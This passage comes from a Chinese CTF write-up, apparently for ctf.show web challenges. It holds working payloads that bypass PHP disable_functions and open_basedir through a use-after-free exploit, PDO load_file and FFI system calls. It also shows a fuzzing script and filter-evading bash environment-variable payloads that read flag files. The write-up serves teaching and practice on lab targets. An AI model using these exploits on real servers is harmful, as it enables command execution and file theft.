invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意传入时省略<?php ?>以及进行url编码</p><h2 id="73-74-web73-74">73-74.web73-74</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，突破禁用函数，求你们别秀了</strong></p><h3 id="解题思路">解题思路</h3><p>利用上一题的payload打一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">error_reporting</span>() has been disabled <span class="keyword">for</span> security reasons in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">ini_set</span>() has been disabled <span class="keyword">for</span> security reasons in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">strlen</span>() has been disabled <span class="keyword">for</span> security reasons in /<span class="keyword">var</span>/www/html/index.<span class="title function_ invoke__">php</span>(<span class="number">19</span>) : <span class="keyword">eval</span>()<span class="string">&#x27;d code on line 154</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Warning: strlen() has been disabled for security reasons in /var/www/html/index.php(19) : eval()&#x27;</span>d code on line <span class="number">154</span></span><br><span class="line">UAF failed</span><br></pre></td></tr></table></figure><p><em>报错<code>strlen()</code>函数被禁用,我们可以自定义函数替代</em></p><blockquote><p>实测题目环境会将更改后的脚本流量洗掉导致502，建议使用非预期解</p></blockquote><p>首先还是用上一题脚本查看目录，发现flag文件变为<code>flagc.txt</code>可能因为放开了open_basedir的限制，导致常规姿势可以使用<br>payload：<code>c=include(&quot;/flagc.txt&quot;);die();</code></p><h2 id="web75-76">web75-76</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，突破禁用函数，求你们别秀了</strong></p><h3 id="解题思路">解题思路</h3><p>还是先用glob协议查看根目录发现<code>/flag36.txt</code><br>利用一下包含和UAF发现都被过滤<br><s>不会，查看hint</s><br>这时可以使用PDO（PHP Data Objects）是一种在PHP里连接数据库的使用接口<br>通过mysql load_file来读取文件来读文件绕过open_basedir和disable_function<br>构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$row</span>[<span class="number">0</span>]) . <span class="string">&quot;|&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>73同理只不过flag位置改变</p><h2 id="web77">web77</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行最后一题，php7.4，基本上命令执行就告一段落了</strong></p><h3 id="解题思路">解题思路</h3><p>先扫目录发现<code>/flag36x.txt</code>和<code>/readflag</code>，利用上一题的payload打一下<br>报错<code>could not find driver </code>,描述中提示是php7.4版本<br>7.4以上的php版本可以使用FFI，即外部函数接口，是指在一种语言里调用另一种语言代码的技术<br>PHP的FFI扩展就是一个让你在PHP里调用C代码的技术</p><p>可以通过FFI来实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后直接访问这个文本文件即可</p><p>构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"><span class="variable">$ffi</span>=FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上面第一句表示创建一个system对象</span></span><br><span class="line"><span class="comment">// 第三句通过$ffi去调用system函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者用这个：</span></span><br><span class="line">c=</span><br><span class="line"><span class="variable">$ffi</span>=FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;/readflag &gt; 1.txt&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web118-环境变量拼接">web118  --环境变量拼接</h2><h3 id="题目描述">题目描述</h3><p><strong>flag in flag.php</strong></p><h3 id="解题思路">解题思路</h3><p>尝试一些基本命令发现全返回evil input，查看注释发现执行<code>&lt;!-- system($code);--&gt;</code><br>可以写一个Fuzz脚本看看都过滤了什么</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fad0c7d5-98ef-4c7c-86c9-08f357e427a0.challenge.ctf.show/&quot;</span></span><br><span class="line"><span class="built_in">list</span> = string.ascii_letters+string.digits+<span class="string">&quot;$+-&#125;&#123;_&gt;&lt;:?*.~/\\ &quot;</span></span><br><span class="line">white_list = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;code&quot;</span> : payload</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;evil input&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(payload, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        white_list += payload</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(white_list.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;空格&quot;</span>))</span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTUVWXYZ$&#125;&#123;_:?.~空格</span></span><br></pre></td></tr></table></figure><p>根据描述，flag在flag.php中，我们可以根据环境变量拼接构造出<code>nl</code>指令读取<br>环境变量用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$PWD和$&#123;PWD&#125;    表示当前所在的目录   /var/www/html</span><br><span class="line">$&#123;#PWD&#125;                 13                          前面加个#表示当前目录字符串长度</span><br><span class="line">$&#123;PWD:3&#125;              r/www/html                  代表从第几位开始截取到后面的所有字符（从零开始）</span><br><span class="line">$&#123;PWD:~3&#125;        html                             代表从最后面开始向前截取几位（从零开始）</span><br><span class="line">$&#123;PWD:3:1&#125;          r</span><br><span class="line">$&#123;PWD:~3:1&#125;        h</span><br><span class="line">$&#123;PWD:~A&#125;           l                               这里的A其实就是表示1</span><br><span class="line">$&#123;SHLVL:~A&#125;        1                              代表数字1</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 利用各个环境变量的最后一位来构造命令</span><br><span class="line">$&#123;PWD&#125;表示当前所在的目录</span><br><span class="line">一般的话都会是/<span class="keyword">var</span>/www/html</span><br><span class="line">$&#123;PATH&#125;表示文件位置相关的环境变量</span><br><span class="line">基本上指的是根目录下的bin目录</span><br><span class="line">即：/<span class="keyword">var</span>/www/html <span class="comment"># ls /bin</span></span><br><span class="line"></span><br><span class="line">那么$&#123;PWD:~A&#125;的结果就是字母 l</span><br><span class="line">而$&#123;PATH:~A&#125;的结果是字母 n  </span><br><span class="line">这里的~A代表是最后一位字符，相应B就是导数第二位字符。同样数字的话<span class="number">0</span>就是最后一位字符</span><br><span class="line">它们拼接在一起正好是nl，能够读取flag，因为通配符没有被过滤，所以可以用通配符代替flag.php --&gt;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$&#123;IFS&#125;????.???</span><br><span class="line">要不，直接输入到框里回车也行，这边是随便输入了一个值用bp抓包后看到参数传递形式是POST才知道用POST传参的</span><br><span class="line"></span><br><span class="line">当然这题还有其他payload：</span><br><span class="line">$&#123;PATH:$&#123;<span class="comment">#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span></span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PATH:$&#123;<span class="comment">#TERM&#125;:$&#123;SHLVL:~A&#125;&#125; ????.???</span></span><br></pre></td></tr></table></figure><h2 id="web119">web119</h2><h3 id="题目描述">题目描述</h3><p><strong>flag in flag.php</strong></p><h3 id="解题思路">解题思路</h3><p>在上一题基础上过滤了PATH和BASH,核心思路依然是环境变量拼接</p><p>预期解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125;     ====&gt;   t</span><br><span class="line"></span><br><span class="line">$&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125;    ====&gt;   /</span><br><span class="line"></span><br><span class="line">/bin/cat flag.php</span><br><span class="line"></span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</span><br></pre></td></tr></table></figure><p>非预期解：</p><p>可以尝试构造 /bin/base64 flag.php 这个命令，只需要 / 和 4 两个字符就可以了，其他的率可以用通配符来代替</p><p>对于 / 的话其实很简单，PWD，即 /var/www/html 的第一个就是，即构造为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD::1&#125;</span><br></pre></td></tr></table></figure><p>但是1是不能使用的，这就可以用到SHLVL：<br>作用：记录多个 Bash 进程实例嵌套深度的累加器，进程第一次打开shell时 ${SHLVL} 就为1，然后再这个shell中再打开一个shell的话此时 ${SHLVL} 就变成了2</p><p>不能使用数字的话，就可以使用这个来代替：<br>/ 的构造变为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD::$&#123;SHLVL&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">然后就需要构造 4 这个字符了，这里可以使用RANDOM</span><br><span class="line"></span><br><span class="line">RANDOM是一个变量值，随机出现整数，范围为：0~32767</span><br><span class="line">虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样</span><br><span class="line">如果需要每次产生的随机数顺序不一样的话，可以在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子</span><br><span class="line"></span><br><span class="line">回到构造 4 这个字符上，再Linux中，$&#123;#xxx&#125;显示的是这个数值的位数，而如果不加 # 的话就是显示这个数原本的值，比如12345再加上#后就是5</span><br><span class="line">在RANDOM中产生的随机数可以是1、2、3、4、5这个5个数，但1，2，3这三个出现的概率很低，所以基本上是4或5，因此如果要使用RANDOM的话其实也有碰运气的成分在里面，没准就撞到了正确的数</span><br></pre></td></tr></table></figure><p>构造4：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#RANDOM&#125;// 也有可能是1、2、3、5，多试几次应该还是能成的，不然就是你太背了</span><br></pre></td></tr></table></figure><p>知道两个字符的构造后，进行命令的整体构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125;$&#123;IFS&#125;????.???</span><br><span class="line">/bin/base64 flag.php这里其实$&#123;IFS&#125;可以不用直接用空格，因为没禁</span><br></pre></td></tr></table></figure><h2 id="web120">web120</h2><h3 id="题目描述">题目描述</h3><p><strong>flag in flag.php</strong></p><h3 id="解题思路">解题思路</h3><p>终于给出了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>多过滤了HOME且payload长度不超过64<br>简单把${IFS}换成空格就可以了<br>我们也可构造其他函数如<code>/bin/cat flag.php</code><br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br></pre></td></tr></table></figure><h2 id="web121">web121</h2><h3 id="题目描述">题目描述</h3><p><strong>师傅们 留口饭吃</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把我们的SHLVL和~给过滤了，我们可以用$&#123;#?&#125;代替</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br><span class="line">/bin/base64 flag.php</span><br></pre></td></tr></table></figure><p>我们也可构造<code>/bin/rev</code><br>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;??$&#123;PWD:$&#123;#?&#125;:$&#123;#?&#125;&#125; ????.???</span><br><span class="line">即code=/???/??v ????.???</span><br><span class="line"></span><br><span class="line">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???</span><br><span class="line">即code=/???/r?? ????.???</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web121">web121</h2><h3 id="题目描述">题目描述</h3><p><strong>师傅们 留口饭吃</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span 